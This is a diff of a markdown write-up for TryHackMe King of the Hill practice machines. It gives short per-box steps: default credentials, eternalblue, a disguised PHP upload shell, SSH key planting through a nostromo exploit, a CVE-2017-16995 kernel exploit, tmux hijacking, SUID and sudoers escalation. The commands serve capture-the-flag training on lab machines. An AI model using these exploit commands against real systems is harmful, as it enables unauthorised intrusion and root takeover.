@@ -1,8 +1,9 @@
-# TryHackMe KOTH Writeup.
+# TryHackMe `King of the Hill (KOTH)` writeup
 
 #
 
-# Panda
+
+## Panda
 
 ssh shifu@$IP
 password: batman
@@ -11,12 +12,12 @@ sudo -l
 
 
 
-# offline
+## offline
 
 msfconsole -> eternalblue
 
 
-# Hackers
+## Hackers
 
 use anonymous login on ftp. You will have a note saying that there is users with weak passwords.
 
@@ -33,7 +34,7 @@ boom. You are root.
 
 
 
-# H1:Hard
+## H1:Hard
 
 on oprt 80 -> admin:niceWorkHackerm4n
 
@@ -54,10 +55,7 @@ then mount it with `sudo mount /dev/xvda1 /mnt`
 then just sudo to root.
 
 
-
-
-
-# Shrek
+## Shrek
 
 check the robots.txt file on port 80, it will give endpoint which will give ssh key for shrek user
 
@@ -70,7 +68,7 @@ change to proper root through changing the sudoers(Don't forget to change file p
 
 
 
-# Fortune
+## Fortune
 
 get the base64 from `nc $IP 3333`
 
@@ -88,7 +86,7 @@ Then use same sudoers technique to gain real root instead effective root.
 
 
 
-# Food
+## Food
 
 there is a direct shell access on port `46969`
 
@@ -104,7 +102,7 @@ DON"T forget to remove sudo privilleges from food once you get the root.
 
 
 
-# Hogwarts
+## Hogwarts
 
 FORGET EVRYTHING AND RUN nmap scan and get the ports of the machine.
 
@@ -121,7 +119,7 @@ you will get ssh credentials for machine in `boot/.pass` it was this one in last
 Then it is just SUID.
 
 
-# Tyler
+## Tyler
 
 On pert 80 webpage check /betatest which will show /etc/passwd so we get the username `narrator`.
 
@@ -132,20 +130,20 @@ now use `/usr/bin/vim -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset
 Now classic change the /etc/sudoers to get the proper root.
 
 
-# Carnage
+## Carnage
 
 On port 82 use burpsuit to upload the shell.gif.php by changing the content type image/gif.
 
-Get the reverse shell, and now go to /tmp/tmux-0
+Get the reverse shell, now add your `id_rsa.pub` to `/home/duku/.ssh/authorized_keys` and ssh into duku.
 
-Now we will use already running tmux session and tap into it to become root.
+now go to /tmp/tmux-0, Now we will use already running tmux session and tap into it to become root.
 
 use `tmux -S default attach -t default`
 
 Now for the king.txt, it is attributed to append only mode. use `echo PhoenixCreation >> /root/king.txt`.
 
 
-# Production
+## Production
 
 `ftp $IP` use anonymous login and get the id_rsa.
 
@@ -160,7 +158,23 @@ then use `sudo /bin/git -p help config` and then `!/bin/sh` to get the root.
 > On port 9002, use `nc $IP 9002` to get direct root shell but it is restricted.
 
 
+## Lion
 
-# TIPS
+on port 8080 there is nostromo runnning which is exploitable through python script.
+
+Get the exploit by `searchsploit -m multiple/remote/47837.py`. Comment the cve-2019 part in code. there is problem in it.
+
+then run `python2 47837.py $IP 8080 "mkdir /home/gloria/.ssh; echo '<id_rsa.pub>' > /home/gloria/.ssh/authorized_keys"`
+
+now `ssh gloria@IP`
+
+this is where another exploit comes in picture. `https://github.com/rlarabee/exploits/tree/master/cve-2017-16995`.
+
+Get the .c file and compile it with `gcc --static cve-2017-16995.c -o exploit && chmod +x exploit`
+
+now you are root. change the passwd and ssh into root for better expierence.
+
+
+## TIPS
 
 Find flags easily: `find / -name *flag*.txt -exec cat "{}" \; 2> /dev/null | egrep -i 'THM'` (Also you can use just `*flag*` but it would be bit slower.)
